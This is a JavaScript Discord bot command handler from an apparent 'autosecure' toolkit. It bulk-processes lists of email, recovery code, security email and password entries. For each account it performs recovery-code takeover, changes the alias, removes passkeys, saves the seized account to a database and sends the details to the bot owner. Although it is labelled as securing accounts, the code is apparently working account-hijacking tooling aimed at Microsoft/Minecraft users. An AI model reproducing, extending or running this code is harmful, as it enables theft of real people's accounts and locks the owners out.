const secure = require('../../../autosecure/utils/secure/recodesecure');
const recoveryCodeSecure = require('../../../autosecure/utils/secure/recoveryCodeSecure');
const generateuid = require('../../../autosecure/utils/generateuid');
const listAccount = require('../../../autosecure/utils/accounts/listAccount');
const insertaccount = require('../../../db/insertaccount');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { queryParams } = require('../../../db/database');

module.exports = {
  name: "admin_bulkrec_modal",
  ownerOnly: true,
  callback: async (client, interaction) => {
    try {
      await interaction.deferReply({ ephemeral: true });

      const raw = interaction.fields.getTextInputValue('bulkrec_data');
      const lines = raw.split('\n').map(l => l.trim()).filter(Boolean);

      if (lines.length === 0) {
        return interaction.editReply('No accounts provided.');
      }

      if (lines.length > 15) {
        return interaction.editReply('You can only secure **15 accounts at a time** to avoid rate limits.');
      }

      // Fetch secureconfig settings from the user's profile
      const settingsRows = await queryParams(
        'SELECT * FROM secureconfig WHERE user_id=?',
        [interaction.user.id]
      );

      if (!settingsRows.length) {
        return interaction.editReply('❌ Secure configuration not found. Please set up your autosecure settings first using /settings.');
      }

      const settings = settingsRows[0];

      await interaction.editReply(`🔐 Bulk securing **${lines.length}** accounts with full autosecure features...\n\n⚙️ Features enabled:\n✅ Primary alias change (if enabled)\n✅ Passkeys removal\n✅ Zyger exploit removal (if enabled)\n✅ All configured autosecure settings`);

      let successCount = 0;
      let failCount = 0;

      for (const line of lines) {
        try {
          const parts = line.split(':');
          
          if (parts.length < 4) {
            console.log(`[ADMIN BULKREC] Invalid format for line: ${line}`);
            failCount++;
            await interaction.user.send(`❌ Invalid format: ${line.substring(0, 50)}... (expected: email:recovery:secemail:password[:mcusername])`);
            continue;
          }

          const email = parts[0];
          const recovery = parts[1];
          const secEmail = parts[2];
          const password = parts[3];
          const username = parts[4] || null;

          if (!email || !recovery || !secEmail || !password) {
            console.log(`[ADMIN BULKREC] Missing required fields for: ${email}`);
            failCount++;
            await interaction.user.send(`❌ Missing required fields for: ${email}`);
            continue;
          }

          const uid = await generateuid();

          // Create status embed
          const statusEmbed = new EmbedBuilder()
            .setTitle('🔐 Admin Bulk Recovery - Account Being Secured')
            .setDescription(`This account is being automatically secured with all autosecure features.`)
            .setColor(0x808080)
            .addFields(
              { name: 'Email', value: email, inline: true },
              { name: 'Security Email', value: secEmail, inline: true },
              { name: 'Status', value: '⏳ Processing...', inline: false }
            )
            .setFooter({ text: 'UID: ' + uid })
            .setTimestamp();

          const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
              .setCustomId(`status|${uid}`)
              .setLabel('⏳ Status')
              .setStyle(ButtonStyle.Primary)
          );

          await interaction.user.send({ embeds: [statusEmbed], components: [row] });

          console.log(`[ADMIN BULKREC] Starting recovery for: ${email} with UID: ${uid}`);

          // First, perform the recovery to get the proper host/authentication
          const recoveryData = await recoveryCodeSecure(email, recovery, secEmail, password, false);
          
          if (!recoveryData || !recoveryData.email2 || !recoveryData.recoveryCode) {
            throw new Error('Recovery failed - could not get recovery data');
          }

          console.log(`[ADMIN BULKREC] Recovery successful, starting autosecure for: ${email}`);

          // Construct the proper recovery host format for recodesecure
          const recoveryHost = `${recoveryData.email2}:${recoveryData.recoveryCode}:${recoveryData.secEmail}:${recoveryData.password}`;

          // Run the full autosecure with recovery (includes alias change, passkeys removal, exploit removal, etc.)
          const acc = await secure(recoveryHost, settings, uid, username);
          
          // Insert account into database
          await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);

          // Send account details
          const accountMsg = await listAccount(acc, uid, client, interaction);
          await interaction.user.send(accountMsg);

          successCount++;
          console.log(`[ADMIN BULKREC] Successfully secured: ${email}`);

        } catch (err) {
          console.error('[ADMIN BULKREC] Error securing account:', err);
          failCount++;
          const errorLine = line.length > 50 ? line.substring(0, 50) + '...' : line;
          await interaction.user.send(`❌ Failed to secure account: ${errorLine}\nError: ${err.message || 'Unknown error'}`);
        }
      }

      const summaryEmbed = new EmbedBuilder()
        .setTitle('✅ Admin Bulk Recovery Complete')
        .setDescription('All accounts have been processed with full autosecure features.')
        .setColor(successCount > failCount ? 0x00ff00 : 0xffa500)
        .addFields(
          { name: '✅ Success', value: `${successCount}`, inline: true },
          { name: '❌ Failed', value: `${failCount}`, inline: true },
          { name: '📊 Total', value: `${lines.length}`, inline: true }
        )
        .setFooter({ text: 'Check your DMs for detailed results' })
        .setTimestamp();

      await interaction.editReply({ embeds: [summaryEmbed] });
      await interaction.user.send({ embeds: [summaryEmbed] });

    } catch (error) {
      console.error('[ADMIN BULKREC] Unexpected error:', error);
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({
          content: `❌ An unexpected error occurred: ${error.message}`,
          ephemeral: true
        });
      } else {
        await interaction.editReply({
          content: `❌ An unexpected error occurred: ${error.message}`
        });
      }
    }
  }
};
